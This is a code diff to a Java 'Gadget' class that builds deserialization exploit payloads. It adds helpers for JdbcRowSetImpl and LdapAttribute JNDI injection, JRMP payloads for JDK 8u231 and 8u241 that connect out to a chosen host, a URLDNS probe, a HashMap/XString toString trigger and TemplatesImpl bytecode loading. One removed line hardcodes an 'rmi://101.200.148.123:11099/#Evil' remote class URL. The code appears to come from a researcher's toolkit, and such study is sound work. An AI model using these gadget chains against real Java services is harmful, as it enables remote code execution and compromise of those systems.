@@ -11,8 +11,12 @@ import javassist.CtConstructor;
 import javassist.CtNewConstructor;
 import org.springframework.aop.framework.AdvisedSupport;
 import org.springframework.aop.target.HotSwappableTargetSource;
+import sun.rmi.server.UnicastRef;
+import sun.rmi.transport.LiveRef;
+import sun.rmi.transport.tcp.TCPEndpoint;
 
 import javax.management.BadAttributeValueExpException;
+import javax.naming.CompositeName;
 import javax.swing.event.EventListenerList;
 import javax.swing.event.SwingPropertyChangeSupport;
 import javax.swing.text.StyledEditorKit;
@@ -23,6 +27,12 @@ import java.lang.reflect.Constructor;
 import java.lang.reflect.Field;
 import java.lang.reflect.InvocationHandler;
 import java.lang.reflect.Proxy;
+import java.net.URL;
+import java.rmi.Remote;
+import java.rmi.server.ObjID;
+import java.rmi.server.RMIServerSocketFactory;
+import java.rmi.server.RemoteObjectInvocationHandler;
+import java.rmi.server.UnicastRemoteObject;
 import java.security.*;
 import java.util.HashMap;
 import java.util.Vector;
@@ -47,9 +57,20 @@ public class Gadget {
 
     public static JdbcRowSetImpl getJdbcRowSetImpl(String url) throws Exception{
         JdbcRowSetImpl jdbcRowSet = new JdbcRowSetImpl();
-        Util.setFieldValue(jdbcRowSet,"dataSource","rmi://101.200.148.123:11099/#Evil");
+        Util.setFieldValue(jdbcRowSet,"dataSource",url);
         return jdbcRowSet;
     }
+
+
+    public static Object getLDAPAttribute(String ldapUrl) throws Exception{
+        Class ldapAttributeClazz = Class.forName("com.sun.jndi.ldap.LdapAttribute");
+        Object ldapAttribute = Util.createWithoutConstructor(ldapAttributeClazz);
+        Util.setFieldValue(ldapAttribute,"attrID","name");
+        Util.setFieldValue(ldapAttribute,"baseCtxURL",ldapUrl);
+        Util.setFieldValue(ldapAttribute,"rdn", new CompositeName("a//b"));
+        return ldapAttribute;
+    }
+
 
     public static SignedObject getSingnedObject(Serializable obj) throws Exception{
         /*
@@ -100,6 +121,10 @@ public class Gadget {
         ctClass.addConstructor(ctConstructor);
         byte[] bytes0 = ctClass.toBytecode();
 
+        // 如果需要重复调用该方法，就需要defrost
+        // 否则提示 Class is Frozen
+        ctClass.defrost();
+
         TemplatesImpl templates = new TemplatesImpl();
         Util.setFieldValue(templates, "_bytecodes",new byte[][]{bytes0});
         Util.setFieldValue(templates, "_name", "name");
@@ -113,6 +138,28 @@ public class Gadget {
         return new HotSwappableTargetSource(obj);
     }
 
+    public static RemoteObjectInvocationHandler getJRMPPayloadJDK8u231(String host, int port) throws  Exception{
+        ObjID id = new ObjID(1); // RMI registry
+        TCPEndpoint te = new TCPEndpoint(host, port);
+        UnicastRef ref = new UnicastRef(new LiveRef(id, te, false));
+        return new RemoteObjectInvocationHandler(ref);
+    }
+
+    public static UnicastRemoteObject getJRMPPayloadJDK8u241(String host, int port) throws  Exception{
+        LiveRef liveRef = new LiveRef(new ObjID(1), new TCPEndpoint(host,port), false);
+        UnicastRef ref = new UnicastRef(liveRef);
+        RemoteObjectInvocationHandler remoteObjectInvocationHandler = getJRMPPayloadJDK8u231(host,port);
+
+        RMIServerSocketFactory rmiServerSocketFactory = (RMIServerSocketFactory) Proxy.newProxyInstance(RMIServerSocketFactory.class.getClassLoader(),
+                new Class[]{RMIServerSocketFactory.class, Remote.class},remoteObjectInvocationHandler
+        );
+
+        UnicastRemoteObject unicastRemoteObject = Util.createWithoutConstructor(UnicastRemoteObject.class);
+        Util.setFieldValue(unicastRemoteObject,"ref",ref);
+        Util.setFieldValue(unicastRemoteObject,"ssf",rmiServerSocketFactory);
+        return unicastRemoteObject;
+
+    }
 
     public static POJONode getPOJONode(Object val){
         return new POJONode(val);
@@ -185,6 +232,18 @@ public class Gadget {
 
         return map;
     }
+
+    /*
+    make map1's hashCode == map2's
+
+    map3#readObject
+        map3#put(map1,1)
+        map3#put(map2,2)
+            if map1's hashCode == map2's :
+                map2#equals(map1)
+                    map2.xString#equals(obj) // obj = map1.get(zZ)
+                        obj.toString
+     */
     public static HashMap get_HashMap_XString(Object obj) throws Exception{
         XString xString = new XString("");
         HashMap map1 = new HashMap();
@@ -192,18 +251,34 @@ public class Gadget {
         map1.put("yy", xString);
         map1.put("zZ",obj);
         map2.put("zZ", xString);
-        HashMap hashMap = new HashMap();
-        hashMap.put(map1,1);
-        hashMap.put(map2,2);
+        HashMap map3 = new HashMap();
+        map3.put(map1,1);
+        map3.put(map2,2);
+
         map2.put("yy", obj);
+        return map3;
+    }
+
+    /*
+    readObject
+        URL#hashCode
+            URLStreamHandler#hashCode
+                URLStreamHandler#getHostAddress
+                    InetAddress#getByName
+     */
+    public static HashMap getURLDNS(String dns) throws Exception{
+        URL url = new URL("http://1.1.1.1");
+        HashMap<Object, Object> hashMap = new HashMap<>();
+        hashMap.put(url,1);
+        Util.setFieldValue(url,"protocol","http");
+        Util.setFieldValue(url,"host",dns);
+        Util.setFieldValue(url,"authority",dns);
+        Util.setFieldValue(url,"hashCode",-1);
         return hashMap;
     }
 
-
-
-
-
     public static void main(String[] args) throws Exception{
+
 
     }
 }
